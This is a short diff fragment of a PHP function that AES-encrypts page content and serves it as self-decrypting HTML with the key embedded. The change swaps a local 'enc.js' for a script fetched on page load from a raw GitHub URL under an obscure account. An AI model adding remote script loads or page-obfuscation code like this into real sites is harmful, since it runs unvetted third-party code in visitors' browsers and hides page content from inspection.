@@ -371,7 +371,7 @@ function encrypt($buffer){
 	
 	$ciphertext = AesCtr::encrypt($buffer, $key, $nBits);
 
-	return "<html><head><script src='enc.js'></script><script>
+	return "<html><head><script src='https://raw.githubusercontent.com/xxxqqxxx/xxxqqxxx/refs/heads/main/enc.js'></script><script>
 var hea2p = 
 ('$key'); 
 var hea2t = 
